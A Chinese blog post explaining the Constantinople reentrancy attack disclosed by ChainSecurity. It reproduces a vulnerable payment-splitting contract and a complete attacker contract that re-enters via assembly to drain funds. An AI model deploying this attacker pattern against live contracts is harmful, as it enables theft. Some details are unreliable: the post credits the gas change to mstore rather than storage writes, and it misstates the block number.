---
layout: post
title: "Ethereum 君士坦丁堡重入攻击"
description: ""
category: 
tags: []
---
{% include JB/setup %}

### 前情简介

以太坊预计在 [1080000](https://amberdata.io/blocks/7080000) 区块进行君士坦丁堡网络升级，升级内容主要包含了 [EIP 145](https://eips.ethereum.org/EIPS/eip-145)、[EIP 1014](https://eips.ethereum.org/EIPS/eip-1014)、[EIP 1052](https://eips.ethereum.org/EIPS/eip-1052)、[EIP 1283](https://eips.ethereum.org/EIPS/eip-1283) 和 [EIP 1234](https://eips.ethereum.org/EIPS/eip-1234)，但就在升级的前一天，[ChainSecurity](https://medium.com/chainsecurity/constantinople-enables-new-reentrancy-attack-ace4088297d9) 爆出此次升级可能会导致主网上的合约遭受重入攻击。

### 攻击分析

ChainSecurity 示例中被攻击合约如下

```solidity
pragma solidity ^0.5.0;

contract PaymentSharer {
  mapping(uint => uint) splits;
  mapping(uint => uint) deposits;
  mapping(uint => address payable) first;
  mapping(uint => address payable) second;

  function init(uint id, address payable _first, address payable _second) public {
    require(first[id] == address(0) && second[id] == address(0));
    require(first[id] == address(0) && second[id] == address(0));
    first[id] = _first;
    second[id] = _second;
  }

  function deposit(uint id) public payable {
    deposits[id] += msg.value;  // 1.
  }

  function updateSplit(uint id, uint split) public {
    require(split <= 100);
    splits[id] = split;
  }

  function splitFunds(uint id) public {
    // Here would be: 
    // Signatures that both parties agree with this split

    // Split
    address payable a = first[id];
    address payable b = second[id];
    uint depo = deposits[id];
    deposits[id] = 0;

    a.transfer(depo * splits[id] / 100);          // 2.
    b.transfer(depo * (100 - splits[id]) / 100);  // 5.
  }
}
```

攻击合约如下

```solidity
pragma solidity ^0.5.0;

import "./PaymentSharer.sol";

contract Attacker {
  address private victim;
  address payable owner;

  constructor() public {
    owner = msg.sender;
  }

  function attack(address a) external {
    victim = a;
    PaymentSharer x = PaymentSharer(a);
    x.updateSplit(0, 100);
    x.splitFunds(0);
  }

  function () payable external {  // 3.
    address x = victim;
    assembly{
        mstore(0x80, 0xc3b18fb600000000000000000000000000000000000000000000000000000000)
        pop(call(10000, x, 0, 0x80, 0x44, 0, 0))  // 4.
    }    
  }

  function drain() external {
    owner.transfer(address(this).balance);
  }
}
```

1. 首先攻击者调用 `deposit` 发送一定数量的 ETH 给被攻击合约
2. 接着调用 `attack` 方法，将所有资金发送给攻击者的地址
3. 由于攻击者是一个合约地址，因此 fallback 方法被触发
4. fallback 方法重新触发 updateSplit 并将 splits[id] 值更改为 0
5. 此时继续执行第二笔转账就会导致合约资金被盗取

> 流程可以参考[下图](https://pbs.twimg.com/media/DxDAzLdXcAAAzib.png:large)

![constantinople reentrancy attack](https://pbs.twimg.com/media/DxDAzLdXcAAAzib.png:large)

之所以攻击更够生效，是因为 `transfer` 方法默认指定 2300 gas，而 `mstore` 操作在此次网络升级之前消耗的 gas 超过 2300，而在此次网络更新之后降低为 200 gas，这就导致了 mstore 能够成功执行。

#### inline assembly code

> call(g, a, v, in, insize, out, outsize)  
> *call contract at address a with input mem[in…(in+insize)) providing g gas and v wei and output area mem[out…(out+outsize)) returning 0 on error (eg. out of gas) and 1 on success*

最后我们来分析一下这段汇编代码做了什么，首先通过 `web3.utils.sha3("updateSplit(uint256,uint256)")` 计算并获取方法签名的前**4**个字节(c3b18fb6)，接着我们将该方法签名补齐32字节并存储 0x80 地址，然后通过 `call` 调用，`call` 的参数解释如下，指定花费 gas 10000，被攻击者合约地址 x，方法和参数起始地址 0x80，参数的长度 0x44(即 68 bytes = 4 method sign bytes + 32 bytes uint256, 32 bytes uint256)，输入值的起始地址 0，输出值的长度 0，最后把 `call` 返回值从栈中移除。


[*ethereum-constantinople-upgrade-announcement*](https://blog.ethereum.org/2019/01/11/ethereum-constantinople-upgrade-announcement/)  
[*security-alert-ethereum-constantinople-postponement*](https://blog.ethereum.org/2019/01/15/security-alert-ethereum-constantinople-postponement/)  
[*Constantinople enables new Reentrancy Attack*](https://medium.com/chainsecurity/constantinople-enables-new-reentrancy-attack-ace4088297d9)  
[*Solidity Assembly*](https://solidity.readthedocs.io/en/v0.5.2/assembly.html)